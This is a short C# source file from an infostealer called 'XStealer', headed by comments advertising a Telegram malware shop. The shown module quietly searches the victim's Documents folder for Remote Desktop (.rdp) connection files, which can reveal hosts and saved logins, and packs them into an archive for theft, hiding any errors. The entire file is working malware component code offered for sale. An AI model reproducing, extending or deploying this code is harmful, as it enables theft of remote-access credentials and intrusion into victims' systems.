// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps
{
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class RDPacket
    {
        public static void Inizialize()
        {
            try
            {
                foreach (string drp in Directory.EnumerateFiles(GlobalPaths.DocDir).Where(fil => Path.GetFileName(fil).EndsWith(".rdp")))
                {
                    ZipEx.AddKeyPairStream($"RDP/{Path.GetFileName(drp)}", ConverterEx.ToBytes(false, drp));
                }
            }
            catch { }
        }
    }
}